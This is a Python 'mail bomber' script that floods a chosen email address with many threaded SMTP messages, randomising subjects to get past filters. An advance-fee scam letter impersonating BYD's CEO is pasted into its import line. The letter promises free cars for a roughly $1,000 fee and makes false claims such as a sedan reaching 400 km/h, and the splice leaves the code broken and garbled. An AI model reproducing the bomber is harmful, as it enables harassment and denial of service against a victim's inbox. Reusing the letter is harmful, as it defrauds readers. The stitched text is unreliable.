#!/usr/bin/python
# this python script sends multiple messages to a target.
import getpass
import smtplib
from wangchuanfu.byd.cn@outlook.comimport Invitation to Participate in BYD Cars Exclusive Giveaway

I hope this message finds you well. My name is Wang Chuanfu Richard fem, and I am the CEO of BYD Cars. It is with great enthusiasm that I announce an exclusive giveaway event featuring our latest and most popular vehicle models. BYD is committed to providing high-quality, innovative cars that are well-suited for modern urban living.

We have received excellent feedback on our BYD Seal model, noted for its impressive performance-easily reaching speeds of 400 km/h in the city-along with a remarkably comfortable and quiet interior. The build quality surpasses expectations, with no interior creaking and excellent body panel fit, comparable to high-end brands.

To celebrate our success and engage with our loyal customer base, we are hosting a giveaway of the following BYD vehicle models:

-   BYD Atto 3: A compact crossover SUV highly regarded for its Euro NCAP safety rating.

-   BYD Dolphin: An agile and versatile mid-size hatchback.

-   BYD Seal: A dynamic and stylish sedan inspired by "Ocean aesthetics.

-   BYD Tang: A spacious and popular SUV model focusing on quality.

-   BYD Seal U: A larger SUV variant available in both all-electric and DM-I plug-in hybrid versions.

To qualify for the giveaway, interested participants must complete an application form, which will be submitted to our Indonesia branch, the current host location for the event. There is an application fee of approximately $1,000, and your chances of approval are high, as I will personally submit your application to the BYD CEO on your behalf.

We are excited to offer this unique opportunity to our valued customers and invite you to submit your application soon. If you have any questions or require further assistance with the application process, please do not hesitate to reach out.

Thank you for your interest and continued support of BYD Cars.

Best regards,
Wang Chuanfu
CEO, BYD Cars

import threading


import random
import time
import colorama
import sys
from colorama import Style
from colorama import Fore


colorama.init()
err = (Fore.RED+Style.BRIGHT+"[-]"+Style.RESET_ALL)
suc = (Fore.BLUE+Style.BRIGHT+"[+]"+Style.RESET_ALL)
text_colour = Fore.YELLOW+Style.BRIGHT

print(Fore.RED + f"""

     ██▓ ███▄    █   █████▒▓█████  ▄████▄  ▄▄▄█████▓ ██▓ ▒█████   ███▄    █     
    ▓██▒ ██ ▀█   █ ▓██   ▒ ▓█   ▀ ▒██▀ ▀█  ▓  ██▒ ▓▒▓██▒▒██▒  ██▒ ██ ▀█   █     
    ▒██▒▓██  ▀█ ██▒▒████ ░ ▒███   ▒▓█    ▄ ▒ ▓██░ ▒░▒██▒▒██░  ██▒▓██  ▀█ ██▒    
    ░██░▓██▒  ▐▌██▒░▓█▒  ░ ▒▓█  ▄ ▒▓▓▄ ▄██▒░ ▓██▓ ░ ░██░▒██   ██░▓██▒  ▐▌██▒    
    ░██░▒██░   ▓██░░▒█░    ░▒████▒▒ ▓███▀ ░  ▒██▒ ░ ░██░░ ████▓▒░▒██░   ▓██░    
    ░▓  ░ ▒░   ▒ ▒  ▒ ░    ░░ ▒░ ░░ ░▒ ▒  ░  ▒ ░░   ░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒     
     ▒ ░░ ░░   ░ ▒░ ░       ░ ░  ░  ░  ▒       ░     ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░    
     ▒ ░   ░   ░ ░  ░ ░       ░   ░          ░       ▒ ░░ ░ ░ ▒     ░   ░ ░     
             ░           ░            ░  ░░ ░                ░      ░ ░           ░     
                                          ░                                             
 ███▄ ▄███▓ ▄▄▄       ██▓ ██▓        ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  
▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒
▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒
▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░       ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  
▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒
░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░
░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░
░      ░     ░   ▒    ▒ ░  ░ ░       ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ 
       ░         ░  ░ ░      ░  ░    ░          ░ ░         ░    ░         ░  ░   ░     
                                          ░                           ░                     
                                                                                                        
     """ + Style.RESET_ALL+text_colour+"                #Coded my McSam\n")


def email_details():
    global from_email, to_email, password, subject, email_message, number, email, err, suc, arrow
    print(text_colour+"\nEnter the email address you want to send the messages from."+Style.RESET_ALL)
    from_email = str(input("[>] "))  # alllow the user to enter the sender's email address
    print(text_colour+"\nEnter your Password here."+Style.RESET_ALL)
    password = str(getpass.getpass("[>] "))  # the sender's password
    print(text_colour+"\nEnter the email you want to bomb."+Style.RESET_ALL)
    to_email = str(input("[>] "))  # allow the user to enter the targets email.
    print(text_colour+"\nEnter the subject of your mail."+Style.RESET_ALL)
    subject = str(input("[>] "))
    print(text_colour+"\nEnter your message here."+Style.RESET_ALL)
    email_message = str(input("[>] "))
    try:
        print(text_colour+"\nEnter the number of mails you want to send."+Style.RESET_ALL)
        number = int(input("[>] "))
    except ValueError:
        print(text_colour+"Invalid Input!!")
        print(text_colour+"\nEnter the number of mails you want to send."+Style.RESET_ALL)
        number = int(input("[>] "))
    email = EmailMessage()
    email["from"] = from_email
    email["to"] = to_email
    email.set_content(email_message)
      # The body of the email.

def change_subject():
    lowerchars = [' 1',' 2',' 3',' 4',' 5',' 6',' 7',' 8',' 9',' 10',' 11',' 12',' 13',' 14',' 15',' 16',' 17',' 18',' 19',' 20',' 21',' 22',' 23',' 24',' 25',' 26','A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z','!','?','%','&','*','@','#']
    smaple_list = random.sample(lowerchars,1)
    subject_2 = subject + smaple_list[0]
    return subject_2


def mail_stuff(smtp_host, smtp_port, subject_1):
    global from_, wangchuanfu.byd.cn@outlook.com to_email, password, email_message, number
    email["subject"] = subject_1
    try:
        with (smtplib.SMTP(host=smtp_host, port=smtp_port)) as smtpObj:
            smtpObj.ehlo()
            smtpObj.starttls()
            smtpObj.login(from_email, password)
            smtpObj.send_message(email)   
        print(suc + " Successfully sent email.")


    except KeyboardInterrupt:
        print(err + " Cancelled!")
        sys.exit()

    except smtplib.SMTPAuthenticationError:
        print(err + " The login creditials may be wrong.")

    except TimeoutError:
        print(err + " A timeout error occured!")

    except:
        print(err + " Unable to send message.")

    del email["subject"] 

def program():
    global from_email, to_email, password, subject_1, email_message, number, lowerchars, subject
    if smtp_sever.lower() == "gmail":
        smtp_host = "smtp.gmail.com"
        smtp_port = 587
        email_details()
        threads = []

        for i in range(number):
            thread = threading.Thread(target=mail_stuff(smtp_host,smtp_port,change_subject()))
            threads.append(thread)

        for i in range(number):
            threads[i].start()

    else:
        print(text_colour+"\nEnter the smtp host."+Style.RESET_ALL)
        smtp_host = str(input("[>] "))
        print(text_colour+"\nEnter the smtp port."+Style.RESET_ALL)
        smtp_port = int(input("[>] "))
        email_details()
        threads = []

        for i in range(number):
            thread = threading.Thread(target=mail_stuff, args=(smtp_host,smtp_port,change_subject(),))
            threads.append(thread)

        for i in range(number):
            threads[i].start()


try:
    print(text_colour+"Enter the name of the smtp relay you want to use."+Style.RESET_ALL)
    smtp_sever = input("[>] ")  # the smtp relay needed to deliver the message
    program()
except KeyboardInterrupt:
    print("\n"+err+" Cancelled!")